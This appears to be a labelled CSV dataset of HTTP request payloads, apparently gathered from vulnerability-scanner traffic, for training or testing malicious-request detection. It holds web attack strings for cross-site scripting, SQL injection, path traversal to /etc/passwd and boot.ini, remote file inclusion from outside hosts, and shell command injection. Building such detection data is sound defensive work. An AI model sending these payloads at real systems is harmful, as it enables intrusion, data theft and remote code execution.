payload,label
"/zabbix/frontends/php/locales.php?download=1&langto=1&extlang["".system('/./tmp/lhmpvdjfem.sh+>+/dev/null+&').""]=1",1
/javascript/17.exe,1
/javascript/.htpasswd.sfish/skipfish://invalid/;?,1
"/ddoworrl.dll?<meta http-equiv=set-cookie content=""testvlau=8517"">",1
/admin/index.php?path_to_script=http://192.168.202.118:8080/ghl9il??&cmd=ls,1
"<meta http-equiv=set-cookie content=""testwldz=3506"">",1
/examples/jsp/sessions/mailbox.php3?actionid=6&server=x&imapuser=x';somesql&pass=x,1
/friend.php?op=sitesent&fname=<script>alert('vulnerable')</script>,1
"/apavxugx.mscgi?<meta http-equiv=set-cookie content=""testdnbh=5237"">",1
/opensiteadmin/scripts/classes/filter.php?path=http://192.168.202.118:8080/moclyxlwqyfjnp?\x00,1
/examples/jsp/error/mrtg.cgi?cfg=/../../../../../../../../../etc/passwd,1
"/copying/a=""%3cscript%20src=%27http://www.example.com/test?rnd=q41226228%27%3e%3c%2fscript%3e"";document.writeln(unescape(a))",1
/b1q8bywu.cfc?<script>cross_site_scripting.nasl</script>,1
"/?<script>document.cookie=""testlihk=7070;""</script>",1
/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../boot.ini,1
/cgi-bin/dansguardian.pl?deniedurl=</a><script>alert('vulnerable');</script>,1
/fa8p8lr8.dll?<script>cross_site_scripting.nasl</script>,1
"/examples/jsp/cal/mail.php?id='/**/union/**/select/**/1,2,1331904463,4--&blog=1",1
/sgdynamo.exe?htname=<script>foo</script>,1
/examples/jsp/num/source?v=../../../../../../../../../../etc/passwd\x00,1
/speedscript_vowels/,1
"/ghswfouu.htm?<meta http-equiv=set-cookie content=""testsqmm=5713"">",1
/scripts/2sfdqydfaknx.asp,1
/en-us/account/cart32.exe,1
/static//..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd,1
/javascript/.passwd.rhtml,1
"/cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,1303050841,0,0,0,0,0--",1
"/zv8tv7h8.cfc?<script>document.cookie=""testcqwz=9752;""</script>",1
//../../../../../../../../etc/passwd\x00en,1
/mambots/editors/path/jscripts/tiny_mce/plugins/preview/preview.php?mosconfig_absolute_path=http://192.168.202.118:8080/zz5thkvtmlgl?,1
/examples/jsp/jsp2/el/sgdynamo.exe?htname=sgdynamo.exe,1
/examples/jsp/num/include/theme.inc.php?fullpath=/etc/passwd\x00,1
"/d44uk9h2.jsp?<script>document.cookie=""testmybc=2088;""</script>",1
/script/init/createallimagecache.php?path_to_code=http://192.168.202.118:8080/tzhfyzkbomspvm?,1
/javascript/cat.exe,1
/y8pmygrp.cfc?<script>cross_site_scripting.nasl</script>,1
/raanw4ia.htm?<script>cross_site_scripting.nasl</script>,1
/scripts/webdist.cgi?distloc=;id,1
"/x2gyorli.pl?<script>document.cookie=""testwhac=3130;""</script>",1
/sophie moon- one of her first hardcore's/,1
/examples/jsp/colors/cwmail.exe,1
/web-passwd/,1
"/x2gyorli.jsp?<meta http-equiv=set-cookie content=""testwhac=3130"">",1
"/uvazfs7p.cfc?<meta http-equiv=set-cookie content=""testwtbo=4831"">",1
"/i2n4v4rl.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/upload.cgi,1
/manager/admin/admin.php?sid=0',1
/modules.php?name=search&file=../../../../../../../../../../etc/passwd\x00,1
/cgi-binmessagedetail.asp?msg_id=',1
/main.php?logout='sleep\x098\x09#,1
"/l752x1ry.fts?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/examples/jsp/jsp2/jspx/search.jsp?q=%""<script>alert(1331904373)</script>",1
/examples/jsp/sessions/texis.exe/nessus,1
/rv98iwjp.do?<script>cross_site_scripting.nasl</script>,1
"/h4bi26jd.aspx?<meta http-equiv=set-cookie content=""testhrzx=1150"">",1
"/admin/login.php?path=\""></form><form name=a><input name=i value=xss>&lt;script>alert('vulnerable')</script>",1
/phpmyadmin/bb_func_txt.php?pathtofiles=/etc/passwd\x00,1
"/o1zj4u9v.jsp?<script>document.cookie=""testabrn=6368;""</script>",1
/subscriptions.py,1
//<body><script src=http://www.example.com/test?rnd=q64732494></script>,1
/scriptorium/,1
/javascript/date.exe,1
/cgi-bin/index.php?user_langue=../../../../../../../../../../etc/passwd,1
/scripts/c0kha6w3apd3.cfm,1
"/main.php?logout=""&ver;>q32916572&rem;",1
/scripts,1
/scripts/www/delivery/ac.php?bannerid=-193+or+1=1,1
/scriptpath/index.php?page=http://cirt.net/rfiinc.txt?,1
/examples/jsp/error/cgi/tseekdir.cgi?location=/etc/passwd\x00,1
/examples/jsp/jsp2/jspx/error.php?selected_theme=<script>alert(uebimiau_selected_theme_xss.nasl)</script>,1
"/qczkquis.asp?<meta http-equiv=set-cookie content=""testkwlg=5591"">",1
/ap58k3ci.jsp?<script>cross_site_scripting.nasl</script>,1
"/scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1332009308,4,5",1
/top.php?stuff=ping;-w;7000;-n;1;1.2.3.4|rem;,1
/6qbynt4f.asp?<script>cross_site_scripting.nasl</script>,1
/gy23xnjq.html?<script>cross_site_scripting.nasl</script>,1
/..\/\..\/\..\/\boot.ini,1
/examples/jsp/num/shopaddtocart.asp?productid='42,1
/help.php?q=';del q86575497 #,1
/examples/jsp/error/newsdesk.cgi?t=../../../../../../etc/passwd,1
"/examples/jsp/checkbox/index.php?name=your account&profile=anyone""><script>alert('nessus was here');</script>",1
/examples/jsp/checkbox/manager/media/browser/mcpuk/connectors/php/commands/thumbnail.php?base_path=/etc/passwd\x00,1
/quagynka.exe?<script>cross_site_scripting.nasl</script>,1
"/1r8cfrlf.asp?<script>document.cookie=""testydan=5106;""</script>",1
"/examples/jsp/colors/notify?from=nessus""|id""",1
/scripts/wx4z4gedhl0l.html,1
/cgi-bin/productsbycategory.asp?intcatalogid=3'&strcatalog_name=nessus,1
"/aj3pf49c.fts?<script>document.cookie=""testnofv=4170;""</script>",1
"/x7pclv4s.do?<meta http-equiv=set-cookie content=""testiulz=3709"">",1
"/ap58k3ci.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/addressbook/index.php?surname=<script>alert('vulnerable')</script>,1
"/d765w06j.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/.passwd.cfm,1
"/fa8p8lr8.dll?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/search.php?searchfor=\""><script>alert(1776)</script>",1
"/fmnveedu.kspx?<meta http-equiv=set-cookie content=""testgfbr=7014"">",1
/b1q8bywu.kspx?<script>cross_site_scripting.nasl</script>,1
/javascript/sling.exe,1
"/help.php?q=""\x0ddel\x09q14674684\x09#",1
"/zabbix/frontends/php/locales.php?download=1&langto=1&extlang["".system('/./tmp/dhbiyrztiq0+>+/dev/null+&').""]=1",1
"/<meta http-equiv=set-cookie content=""testbnli=1975"">",1
/examples/jsp/checkbox/?mod=read&id=../../../../../../../../../../../../../etc/passwd\x00,1
/forum.asp?n=/etc/passwd\x00|41|80040e14|[microsoft][odbc_sql_server_driver][sql_server]line_1:_incorrect_syntax_near_&#039;/&#039;.,1
/en-us/jnv890lt.html?<script>cross_site_scripting.nasl</script>,1
"/egaet53a.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/examples/servlets/servlet/server.pt?open=space&name="";}</script><script>alert('plumtree_name_xss.nasl')</script>",1
"/t3af3tdz.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/help.php?q=;del q47158875 #,1
/module/forum/forum.php?fd=http://192.168.202.118:8080/tzhfyzkbomspvm?=';,1
"/help.php?q=""ping\xa0-w\xa08000\xa0-n\xa01\xa01.2.3.4|rem\xa0",1
"/nyvbv05h.do?<meta http-equiv=set-cookie content=""testftxz=5980"">",1
/cgi-bin/starnet/addons/slideshow_full.php?album_name='594147117,1
"/</a><script>alert(""xss"")</script>",1
/index.php?page=../../../../../../../../../../etc/passwd,1
"/top.php?stuff=""uname #",1
/examples/jsp/jsp2/el/ovlaunch.exe,1
"/m4kkjf8l.htm?<meta http-equiv=set-cookie content=""testyglc=8988"">",1
/top.php?stuff=ver\x09>q64218613&rem\x09,1
/scripts/index.php?id=egyb16sayu',1
/examples/jsp/jsp2/jspx/lang/lang.php?lang_path=/etc/passwd\x00,1
/help.php?q=ver >q35544262&rem ,1
/help.php?q='\x0duname >q58812882 #,1
/javascript/document.cnf,1
/ows-bin/oasnetconf.exe?-l -s blahblah,1
/cgi-bin/webbbs.exe,1
/ciamos_path/modules/forum/include/config.php?module_cache_path='http://192.168.202.118:8080/moclyxlwqyfjnp?',1
/notice-description/,1
"/fmnveedu.mscgi?<script>document.cookie=""testgfbr=7014;""</script>",1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo""+||+echo+a+5f5+>>esbq",1
/examples/jsp/cal/auktion.cgi?menue=../../../../../../../../../etc/passwd,1
/javascript/note.exe,1
"/<meta http-equiv=set-cookie content=""testcmax=9270"">",1
/sojourn.cgi?cat=../../../../../etc/passwd\x00,1
/admin/config.php?display=1'or1=1,1
"/main.php?stuff=""|ping\x0b-w\x0b10000\x0b-n\x0b1\x0b4.3.2.1|rem\x0b",1
"/o6ebbirj.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripten/,1
/examples/servlets/servlet/showcat.php?cat=1',1
"/xsqln7eb.htm?<script>document.cookie=""testpcbb=9254;""</script>",1
/examples/jsp/error/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331904365&lang_crm=../../../../../../../../../../../..//etc/passwd\x00,1
/iissamples/sdk/asp/docs/winmsdp.exe?source=/iissamples/\xc0\xae\xc0\xae/default.asp,1
"/qczkquis.cgi?<meta http-equiv=set-cookie content=""testkwlg=5591"">",1
"/rpxyx07v.asp?<meta http-equiv=set-cookie content=""testbnli=1975"">",1
"/mail.php?id='/**/union/**/select/**/1,2,1332008335,4--&blog=1",1
/9o6g5vkn.aspx?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/cal/index.php?configfile=../../../../../../../../../etc/passwd,1
"/cacti/mail.php?id='/**/union/**/select/**/1,2,1331905235,4--&blog=1",1
"/cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331923203,1242183873 -- ",1
/en-us/account/pfdispaly.cgi?../../../../../../etc/passwd,1
/transcript-6/,1
/profile.php?user='<iframe src=javascript:alert(%27wvs-xss-magic-string-410026083323%27)></iframe>,1
"/en-us/i686v90l.aspx?<meta http-equiv=set-cookie content=""testfutf=1550"">",1
"/help.php?q=""rm q97915511&rem ",1
"/hipkz026.jsp?<meta http-equiv=set-cookie content=""testyrbs=2855"">",1
"/oie504mr.dll?<meta http-equiv=set-cookie content=""testtpby=7052"">",1
/fo564rei.dll?<script>cross_site_scripting.nasl</script>,1
"/help.php?q=""del\x0bq49522765&rem\x0b",1
/javascript/insert.exe,1
"/h4bi26jd.htm?<meta http-equiv=set-cookie content=""testhrzx=1150"">",1
/en-us/jnv890lt.pl?<script>cross_site_scripting.nasl</script>,1
/javascript/inc.exe,1
/examples/jsp/num/loudblog/inc/parse_old.php?template=@system(id);@&php_use=1&phpseparator=@,1
/examples/jsp/colors/phptonuke.php?filnavn=/etc/passwd,1
/hoteldescription/,1
/scripts/event_view.php?eid=34 union select 692795576,1
/recordings/index.php?action=login&languages[nessus]=syscp_1211.nasl&language=nessus&langs[nessus][0][file]=/etc/passwd,1
"/h4bi26jd.php?<meta http-equiv=set-cookie content=""testhrzx=1150"">",1
/bn857frh.pl?<script>cross_site_scripting.nasl</script>,1
/main.php?frm_daynight=q68663511&frm_passwd=&frm_referer=http%3a//192.168.26.202/main.php%3flogout%3d1&frm_user=&scr_height=&scr_width=,1
"/scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1331904243,4,5",1
/javascript/50.exe,1
/citrix/metaframexp/default/login.asp?nfuse_logoutid=&nfuse_messagetype=error&nfuse_message=<script>alert('ritchie')</script>&clientdetection=on,1
/phpmyadmin/login.php?lang=/../../../../../../../../../../../../etc/passwd\x00,1
"/0z575z74.cfm?<script>document.cookie=""testuhsv=9753;""</script>",1
/scripts/..%u00255c..%u00255c/winnt/system32/cmd.exe?/c+dir+c:\+/og,1
"/main.php?stuff=""&rm\x0bq12538123&rem\x0b",1
"/?<meta http-equiv=set-cookie content=""testqppc=8767"">",1
"/scripts/forum.php?forum=-1 union select null,123456,null,null,null,null--",1
/examples/jsp/checkbox/ikonboard.cgi?act=st&f=1&t=1&hl=nessus&st=',1
/opensiteadmin/scripts/classes/databasemanager.php?path=http://192.168.202.96:8080/frznctvhi0i5?\x00,1
"/top.php?stuff=""ver\x0b>q24192811&rem\x0b",1
/examples/jsp/num/sql.php?lib_inc=1&btndrop=no&goto=/etc/passwd,1
/ahn'qiraj/,1
/admin/common/script.js.php~,1
"/top.php?stuff=""ping -w 9000 -n 1 1.2.3.4&rem ",1
"/byrg33fw.asp?<script>document.cookie=""testexuu=5340;""</script>",1
/cacti/shopexd.asp?catalogid='42,1
"/examples/jsp/checkbox/dsweb/services/user-1""><body onload=alert('xerox_docushare_dsweb_xss.nasl')>",1
/main.php?frm_daynight=day&frm_passwd=&frm_referer=http%3a//192.168.23.202/main.php%3flogout%3d1&frm_user=&scr_height=&scr_width=q25559316,1
"/fmnveedu.aspx?<meta http-equiv=set-cookie content=""testgfbr=7014"">",1
/javascript/htpasswd.sh,1
"/x2gyorli.php3?<script>document.cookie=""testwhac=3130;""</script>",1
/actionscriptcode1/,1
"/9kr0ih0v.jspa?<meta http-equiv=set-cookie content=""testzgnm=1183"">",1
/d5a5renl.php3?<script>cross_site_scripting.nasl</script>,1
/recordings/core/editor.php?editor_insert_bottom=/etc/passwd,1
"/qb2xy9aw.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/libraries/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/simple/view_page?mv_arg=|cat /etc/passwd|,1
"/oie504mr.mscgi?<script>document.cookie=""testtpby=7052;""</script>",1
/scripts/prnnucptkixl.pl,1
/scripts/callboth.php?seq=654321&out=123456&in=1331905185@nessus\x0d\x0aasteridex_in_code_injection.nasl,1
/help.php?q='uname\x09>q77922174\x09#,1
/script_path/cms/classes/openengine/filepool.php?oe_classpath=http://192.168.202.118:8080/2aibfaczmac8??,1
/nukescripts/,1
/examples/jsp/sessions/a1disp3.cgi?/../../../../../../etc/passwd,1
"/top.php?stuff=""\x0duname\x09>q29585118\x09#",1
/scripts/n4p4f4gtbhia.cgi,1
/read.php?pagenum_rsread=1&totalrows_rsread=<script>alert('wvs-xss-magic-string-414546083580')</script>,1
../../../../../../../../../../etc/passwd,1
/manager/add_url.htm?node=<script>alert('xss')</script>,1
"/modif_infos.asp?n=/.\""./.\""./.\""./.\""./.\""./boot.ini",1
"/phpmyadmin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- ",1
/examples/jsp/checkbox/shopper.cgi?newpage=../../../../../../etc/passwd,1
/ciamos_path/modules/forum/include/config.php?module_cache_path='http://192.168.202.118:8080/zz5thkvtmlgl?',1
"/byrg33fw.jspa?<script>document.cookie=""testexuu=5340;""</script>",1
/scripts/zq9frlz6fcfp.inc,1
/blue's/,1
/manager/newsscript.pl?mode=admin,1
/j4drbkil.kspx?<script>cross_site_scripting.nasl</script>,1
/cgi-bin/atomicboard/index.php?location=../../../../../../../../../../../../../../../etc/passwd,1
/examples/jsp/sessions/classes/adodbt/sql.php?classes_dir=/etc/passwd\x00,1
/scripts/pssdseehtgdp.inc,1
/xfkun1ku.dll?<script>cross_site_scripting.nasl</script>,1
/l752x1ry.jspa?<script>cross_site_scripting.nasl</script>,1
"/<script>document.cookie=""testblcp=8120;""</script>",1
/eei78ore.pl?<script>cross_site_scripting.nasl</script>,1
/scripts/c0kha6w3apd3.sh,1
"/xsqln7eb.fts?<meta http-equiv=set-cookie content=""testpcbb=9254"">",1
/javascript/pwd.exe,1
"/manager/search.jsp?q=%""<script>alert(1331904373)</script>",1
/javascript/owl.exe,1
/cgi-bin/emu/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd\x00,1
/scripts/manage/login.asp,1
"/<script>document.cookie=""testyglc=8988;""</script>",1
/report.php?scriptpath=http://192.168.202.118:8080/2aibfaczmac8??,1
"/top.php?stuff=""&rm\xa0q97411474&rem\xa0",1
/free-scripts/,1
"/examples/servlets/servlet/awstatstotals.php?sort=""].passthru('id').exit().$a[""",1
/cgi-915/webbbs/webbbs_config.pl?body=aaaaffff&email=test@example.com&followup=10;cat /etc/passwd&name=joe,1
/scripts/phf?qalias=x\x0a/bin/cat /etc/passwd,1
"/byrg33fw.htm?<meta http-equiv=set-cookie content=""testexuu=5340"">",1
/cp job description 2006/,1
/scriptpath/footers.php?tinybb_footers=http://192.168.202.118:8080/ghl9il?,1
"/i2n4v4rl.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/cacti/cgiip.exe/wservice=wsbroker1/webutil/ping.p,1
"<meta http-equiv=set-cookie content=""testotoy=6142"">",1
/cgi-home/nph-showlogs.pl?files=../../&filter=.*&linecnt=500&refresh=0&submit=go,1
"/help.php?q=""uname\x09>q12928131\x09#",1
/\..\..\..\..\winnt\win.ini,1
/top.php?stuff=;sleep\x097\x09#,1
/j2kdmfw4.jsp?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/cal/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
"/help.php?q=""ping\x0b-w\x0b11000\x0b-n\x0b1\x0b1.2.3.4&rem\x0b",1
/manager/starnet/addons/slideshow_full.php?album_name='1751116086,1
/static//./../../../../../../../.etc/passwd,1
"/scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1332010400,529560500 --",1
/_vti_bin/shtml.exe?_vti_rpc,1
/javascript/changes.exe,1
/iisprotect/admin/siteadmin.asp?v_sitename=&v_firsttab=groups&v_secondtab=all&groupname=nessus',1
"/0u75ldxq.x?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/help.php?q=ver;>q25171792&rem;,1
"/examples/jsp/cal/activatemember?activatecode=&member=""><script>alert('mvnforum_activatemember_xss.nasl')</script>",1
/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331904181&lang_crm=../../../../../../../../../../../..//etc/passwd\x00,1
"/help.php?q=""ver;>q77231587&rem;",1
"/scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--",1
/main.php?stuff=ver&rem;,1
"/readmore.php?config[\""sipssys\""]=http://cirt.net/rfiinc.txt?",1
/recordings/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name= ;id; ,1
"/?<script>document.cookie=""testbgqj=6434;""</script>",1
"/main.php?logout="";del q32339726 #",1
/cgi-bin/mail/nph-mr.cgi?do=loginhelp&configlanguage=../../../../../../../etc/passwd\x00,1
/scripts/tomcat_proxy_directory_traversal.nasl1332010400,1
"/hipkz026.asp?<meta http-equiv=set-cookie content=""testyrbs=2855"">",1
/script_path/cms/classes/openengine/filepool.php?oe_classpath=http://192.168.202.118:8080/tzhfyzkbomspvm??,1
/securescripting/,1
/index.php?id=mumrj3sj0o',1
/cgi-bin/index.php?cat=',1
"/0rufe52p.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/manager/hsx.cgi?show=../../../../../../../../../../../../../etc/passwd\x00,1
/en-us/n9xlumt5.mscgi?<script>cross_site_scripting.nasl</script>,1
/top.php?stuff=ver\x0c>q49699449&rem\x0c,1
/main.php?frm_daynight=day&frm_passwd=&frm_referer=http%3a//192.168.28.202/main.php%3fstuff%3d1985387140&frm_user=&scr_height=q52912831&scr_width=,1
"/jw64yq8u.x?<script>document.cookie=""testylfu=1313;""</script>",1
"/hjdzm96v.idc?<meta http-equiv=set-cookie content=""testbyqe=7474"">",1
"/zabbix/frontends/php/locales.php?download=1&langto=1&extlang["".system('chmod+555+/tmp/ldlivpaolb0;').""]=1",1
"/ybz5rz7a.cfm?<script>document.cookie=""testsbvw=6289;""</script>",1
"/en-us/hipkz026.cfm?<script>document.cookie=""testyrbs=2855;""</script>",1
/cgi-win/testcgi.exe,1
/help.php?q=@',1
/oldtranscripts/,1
/o35zot2r.cfc?<script>cross_site_scripting.nasl</script>,1
/javascript/alpha.exe,1
/help.php?q='&uname >q65268232 #,1
"/7uz3ok60.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/t99iadgtkf9h.inc,1
/scriptkiddies/,1
"/w4996nr0.do?<script>document.cookie=""testttvs=7163;""</script>",1
/cgi-bin/store.php?crn=42'&action=show&show_products_mode=cat_click,1
/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1332010390&lang_crm=../../../../../../../../../../../..//etc/passwd\x00,1
"/top.php?stuff=""|ping\xa0-w\xa010000\xa0-n\xa01\xa01.2.3.4|rem\xa0",1
"/0qhcnefz.jsp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/main.php?stuff='&del q83741819 #,1
/javascript/tmps.exe,1
"/top.php?stuff=""&ping;-w;9000;-n;1;1.2.3.4&rem;",1
/scripts/ylrvly9nh_pf.php3,1
/ciamos_path/modules/forum/include/config.php?module_cache_path='http://192.168.202.118:8080/2aibfaczmac8?',1
/javascript/it.exe,1
"/awstats/awstats.pl?migrate=|echo;/bin/echo -en ""zj\0003x\0315\0200xp1\0322\0262\0377\0266\0377\0001\0320"" >> /tmp/yzicxmyifv0;echo|awstats957386.txt",1
/fcgi-bin/fileseek2.cgi?foot=;cat /etc/passwd&head=,1
"/examples/jsp/num/user.cgi?url=""><script>alert(""gossamer_links_url_xss.nasl"");</script>&from=add",1
/cgi-bin/mrtg.cgi?cfg=/../../../../../../../../../etc/passwd,1
/scripts/mundimail/template/simpledefault/admin/_masterlayout.php?top=http://192.168.202.96:8080/ipb5ri?,1
/javascript/axis2.exe,1
/d765w06j.x?<script>cross_site_scripting.nasl</script>,1
/what's new grandstream sale/,1
"/cgi-bin/notify?from=nessus""|id""",1
/main.php?stuff=&ver >q24433373&rem ,1
/xboxsubscriptionplan/,1
"/apavxugx.php3?<script>document.cookie=""testdnbh=5237;""</script>",1
"/xsqln7eb.php?<script>document.cookie=""testpcbb=9254;""</script>",1
"/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331905220','5'--",1
/k/home?dir=/&file=../../../../../../../../../../../../etc/passwd&lang=kor,1
/examples/servlets/servlet/gadgets/blog/blogmodel.php?path=/etc/passwd\x00,1
/opensiteadmin/scripts/classes/databasemanager.php?path=http://192.168.202.96:8080/txenjrxf3?\x00,1
/examples/jsp/sessions/tinybrowser/upload.php?badfiles=1><script>alert('tinybrowser_multiple_xss.nasl')</script>,1
/tukodz3j.kspx?<script>cross_site_scripting.nasl</script>,1
"/5o9zq43e.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/administrator/components/com_feederator/includes/tmsp/subscription.php?globals[mosconfig_absolute_path]=http://192.168.202.118:8080/2aibfaczmac8?,1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo""+||+echo+db+00+10+00+00+00+20+00+00+00+00+40+00+00+10+00+00+00+02+00+00+04+00+00+00+00++>>esbq",1
"/o6ebbirj.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/phpmyadmin/webcart.cgi?config=mountain&change=yes&nextpage=;id|&code=phold,1
"/redirect.php/""><script>alert(413055588068)</script>?subject=server&server=test",1
/phpnews/sendtofriend.php?mid='1',1
/symantec sued for labeling product 'adware'/,1
"/ju0u7kfo.jsp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/6wb70v0b.pl?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/.htaccess.sfish/'`true`',1
/bemarket/postscript/postscript.php?p_mode=http://192.168.202.96:8080/whmch8ftkt7kv?,1
/quagynka.dll?<script>cross_site_scripting.nasl</script>,1
/javascript/htpasswd.pdf,1
/sysuser/docmgr/template.stm?path=<script>alert(document.cookie)</script>,1
"/aj3pf49c.jsp?<meta http-equiv=set-cookie content=""testnofv=4170"">",1
/cgi-bin/awstatstotals.php?sort={${phpinfo()}}{${exit()}},1
"/x7pclv4s.jspa?<script>document.cookie=""testiulz=3709;""</script>",1
"/<meta http-equiv=set-cookie content=""testquyx=2820"">",1
/prescriptionviagra/,1
"/main.php?logout=""del q41454446&rem ",1
"/i686v90l.nsf?<script>document.cookie=""testfutf=1550;""</script>",1
/o6ebbirj.jsp?<script>cross_site_scripting.nasl</script>,1
/javascript/signon.exe,1
/main.php?stuff='\x0auname #,1
"/help.php?q="";rm q43236884 #",1
"/3m5knyc4.php?<meta http-equiv=set-cookie content=""testbgqj=6434"">",1
"/main.php?stuff=""&ping\x09-w\x0910000\x09-n\x091\x094.3.2.1&rem\x09",1
/pam_script/,1
/examples/jsp/checkbox/alienform.cgi?_browser_out=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd,1
/scripts/forum/hcspecific/enableforum.asp?action=enableforum&forumid='hosting_controller_forumid_sql_injection.nasl,1
/r3le3om5.htm?<script>cross_site_scripting.nasl</script>,1
"/main.php?stuff=""ver\x09>q42253935&rem\x09",1
"/6dlc2zm9.aspx?<script>document.cookie=""testqpux=4016;""</script>",1
"/d7ktpmcq.mscgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/export.exe,1
/scripts/rest/api/2.0.alpha1/serverinfo,1
"<script>document.cookie=""testotoy=6142;""</script>",1
/javascript/bin.exe,1
/javascript/document.tar.gz,1
/file_smbpasswd/,1
/scriptsite_information/,1
/examples/jsp/sessions/ncbook.cgi?action=default&current=|cat /etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10,1
/examples/jsp/cal/login.php?lang=/../../../../../../../../../../../../etc/passwd\x00.txt,1
/www/delivery/fc.php?max_type=../../../../../../../../../../etc/passwd\x00,1
/opensiteadmin/scripts/classes/filters/singlefilter.php?path=http://cirt.net/rfiinc.txt?\x00,1
/vwmg565s.html?<script>cross_site_scripting.nasl</script>,1
"/de3v2dd9.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/cacti/docs/index.php?lang=/../../../../../../../../../../etc/passwd\x00,1
"/rbec2ohx.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/num/index.php?post=../config/password,1
/eei78ore.cfc?<script>cross_site_scripting.nasl</script>,1
/cgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah,1
/examples/jsp/cal/pfdispaly.cgi?../../../../../../etc/passwd,1
/usr/extensions/get_infochannel.inc.php?root_path=http://cirt.net/rfiinc.txt??cmd=id;pwd,1
/descriptionvakkengids/,1
"/?<meta http-equiv=set-cookie content=""testabrn=6368"">",1
/scripts/6gl21a1hiz3s.shtml,1
/javascript/eng.exe,1
"/i7prbs22.exe?<meta http-equiv=set-cookie content=""testjnre=7328"">",1
/javascript/.passwd.htm,1
/script/menu/menuprincipal.php?path_inc=http://192.168.202.118:8080/zz5thkvtmlgl?,1
/javascript/htpasswd.old,1
/scripts/www/delivery/ac.php?bannerid=-206+or+1=1,1
"/help.php?q=""del,q58627156&rem,",1
"/cgi-bin/wordtrans.php?command=show_desc&advanced=1"";id; true """,1
"/addvip.php?msetstr[""progsdir""]=http://192.168.202.96:8080/4dckqcc0acprbz?",1
/examples/jsp/num/index2.cgi?frames=yes&board=demo&mode=current&threads=collapse&message=../../../../../../../../../../etc/passwd\x00,1
"/en-us/i686v90l.aspx?<script>document.cookie=""testfutf=1550;""</script>",1
"/help.php?q=""|ping -w 9000 -n 1 1.2.3.4|rem ",1
/mpcgi/a1stats/a1disp3.cgi?../../../../../../../../../../etc/passwd,1
